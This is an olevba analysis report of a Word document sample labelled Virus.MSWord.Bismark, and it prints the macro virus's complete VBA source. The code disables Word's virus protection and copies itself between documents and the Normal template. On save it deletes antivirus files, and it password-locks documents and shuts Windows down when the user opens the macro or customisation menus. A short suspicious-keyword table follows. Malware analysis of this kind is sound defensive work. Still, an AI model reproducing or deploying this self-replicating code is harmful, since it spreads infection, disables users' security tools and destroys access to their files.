olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bismark
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bismark - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO BisMark.bas 
in file: Virus.MSWord.Bismark - OLE stream: 'Macros/VBA/BisMark'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error GoTo BisMark

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
      
    SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    documentinstalled = False
    Globalinstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "BisMark" Then
            documentinstalled = True
        End If
   Next
  
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "BisMark" Then
            Globalinstalled = True
        End If
    Next

    If documentinstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="BisMark", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If Globalinstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BisMark", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

BisMark:
BisMark
End Sub
Sub BisMark()
On Error GoTo BisMark
Application.StatusBar = True
StatusBar = "BisMark1 WMV97"
Application.Caption = "BisMark1 WMV97"
With ActiveDocument
.BuiltInDocumentProperties(wdPropertyTitle) = "BisMark1"
.BuiltInDocumentProperties(wdPropertySubject) = "Word Macro Virri"
.BuiltInDocumentProperties(wdPropertyAuthor) = "Talon 1997"
.BuiltInDocumentProperties(wdPropertyManager) = "Talon 1997"
.BuiltInDocumentProperties(wdPropertyCompany) = "Virii Productions"
.BuiltInDocumentProperties(wdPropertyComments) = "This Word Macro Virus was Made By Talon"
End With
If WeekDay(Now()) = 4 And Hour(Now()) = 12 Then
AutoCorrect.Entries.Add Name:="the", Value:="Word Macro Virus BisMark1, Written By Talon"
Else
End If
BisMark:
End Sub
Sub ToolsMacro()
On Error GoTo BisMark
ActiveDocument.Password = "Bismark"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "You Should Have Left Me Alone, I Was Not Hurting Anything. Now I'am Mad!"
.Heading = "Word Macro Virus BisMark1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

BisMark:
End Sub
Sub Toolscustomize()
On Error GoTo BisMark
ActiveDocument.Password = "Bismark"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "You Should Have Left Me Alone, I Was Not Hurting Anything. Now I'am Mad!"
.Heading = "Word Macro Virus BisMark1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

BisMark:
End Sub
Sub ViewVBcode()
On Error GoTo BisMark
ActiveDocument.Password = "Bismark"
Documents.Close SaveChanges:=wdSaveChanges

Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "You Should Have Left Me Alone, I Was Not Hurting Anything. Now I'am Mad!"
.Heading = "Word Macro Virus BisMark1"
.Animation = msoAnimationSearching
.Show
End With
Tasks.ExitWindows

BisMark:
End Sub
Sub FileSave()
On Error Resume Next
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
Kill "C:\program files\antiviral toolkit pro\*.*"
ActiveDocument.Save
End Sub
Sub FileClose()
On Error GoTo BisMark

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    documentinstalled = False
    Globalinstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "BisMark" Then
            documentinstalled = True
        End If
   Next
  
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "BisMark" Then
            Globalinstalled = True
        End If
    Next

    If documentinstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="BisMark", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If Globalinstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="BisMark", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

BisMark:
ActiveDocument.Close
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

